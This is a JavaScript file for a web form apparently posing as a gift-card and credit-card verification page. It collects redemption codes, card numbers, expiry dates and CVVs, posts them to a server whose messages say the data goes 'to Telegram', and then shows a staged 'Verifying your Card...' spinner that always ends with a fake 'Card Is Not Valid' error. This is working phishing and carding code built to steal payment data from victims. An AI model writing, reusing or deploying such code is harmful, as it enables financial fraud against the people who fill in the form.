function updateForm() {
  const cardType = document.getElementById("cardType").value;
  const dynamicFields = document.getElementById("dynamicFields");

  const simpleRedemptionCards = [
    "Amazon", "AppleiTunes", "sephora", "Razergold", "eBay", "Steam"
  ];

  const creditCards = ["Visa", "MasterCard", "American-express", "Walmartvisa"];

  if (simpleRedemptionCards.includes(cardType)) {
    dynamicFields.innerHTML = `
      <input type="text" placeholder="Redemption Code">
    `;
  } else if (creditCards.includes(cardType)) {
    dynamicFields.innerHTML = `
      <input type="text" placeholder="Card Number">
      <input type="text" placeholder="Expiration Date (MM/YY)">
      <input type="text" placeholder="CVV">
    `;
  } else {
    dynamicFields.innerHTML = ``;
  }
}

function toggleMenu() {
  const navList = document.getElementById('navList');
  navList.classList.toggle('show');
}

// Close menu on nav item click
document.addEventListener('DOMContentLoaded', () => {
  const navLinks = document.querySelectorAll('.nav-list p, .nav-list button');
  navLinks.forEach(link => {
    link.addEventListener('click', () => {
      const navList = document.getElementById('navList');
      if (navList.classList.contains('show')) {
        navList.classList.remove('show');
      }
    });
  });

  // Animate on scroll
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, {
    threshold: 0.1
  });

  document.querySelectorAll('.animate-on-scroll').forEach(el => {
    observer.observe(el);
  });

  // Smooth scroll for all buttons with data-scroll-target
  document.querySelectorAll('[data-scroll-target]').forEach(button => {
    button.addEventListener('click', function() {
      const targetSelector = this.getAttribute('data-scroll-target');
      const target = document.querySelector(targetSelector);
      if (target) {
        target.scrollIntoView({ behavior: 'smooth' });
      }
    });
  });
});
function updateForm() {
  const cardType = document.getElementById("cardType").value;
  const dynamicFields = document.getElementById("dynamicFields");

  if (cardType === "MasterCard" || cardType === "American-express" || cardType === "Walmartvisa") {
    dynamicFields.innerHTML = `
      <input type="text" id="cardNumber" placeholder="Card Number">
      <input type="text" id="expirationDate" placeholder="Expiration Date (MM/YY)">
      <input type="text" id="cvv" placeholder="CVV">
    `;
  } else if (cardType === "Amazon" || cardType === "ebay" || cardType === "Steam" || cardType === "AppleiTunes" || cardType === "googleplay" || cardType === "Razergold" || cardType === "sephora" || cardType === "Nike") {
    dynamicFields.innerHTML = `
      <input type="text" id="codeField" placeholder="Redemption Code">
    `;
  } else {
    dynamicFields.innerHTML = "";
  }
}

document.querySelector(".continue-btn").addEventListener("click", function() {
  // Get the static fields
  const cardType = document.getElementById("cardType").value;
  const currency = document.querySelector(".form-group select").value;
  const amount = document.querySelector(".form-group input").value;

  const data = {
    cardType,
    currency,
    amount
  };

  // Collect dynamic fields
  const dynamicInputs = document.querySelectorAll("#dynamicFields input");
  dynamicInputs.forEach(input => {
    data[input.id] = input.value;
  });

  console.log("Form data:", data);
    // Send the data to the server
  fetch('/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(res => {
    if (res.ok) {
      console.log("✅ Data sent to Telegram");
    } else {
      console.error("❌ Server error while sending to Telegram");
    }
  })
  .catch(err => {
    console.error("❌ Network error:", err);
  });


  // Clear fields
  document.getElementById("cardType").selectedIndex = 0;
  document.querySelector(".form-group select").selectedIndex = 0;
  document.querySelector(".form-group input").value = "";
  document.getElementById("dynamicFields").innerHTML = "";

  // Show the modal
  const modal = document.getElementById("modal");
  const modalMessage = document.getElementById("modalMessage");
  const modalSpinner = document.getElementById("modalSpinner");

  modal.style.display = "block";
  modalMessage.textContent = "Verifying your Card...";
  modalSpinner.style.display = "block";

  // After 5 seconds, show the error message
  setTimeout(() => {
    modalMessage.textContent = "This Card Is Not Valid. Please Contact Our Customer Care ❌.";
    modalSpinner.style.display = "none";
  }, 5000);


// When clicking anywhere on the modal overlay, close it
modal.addEventListener("click", function(event) {
  // If the click was outside the modal content, close the modal
  if (event.target === modal) {
    modal.style.display = "none";
  }
});

});




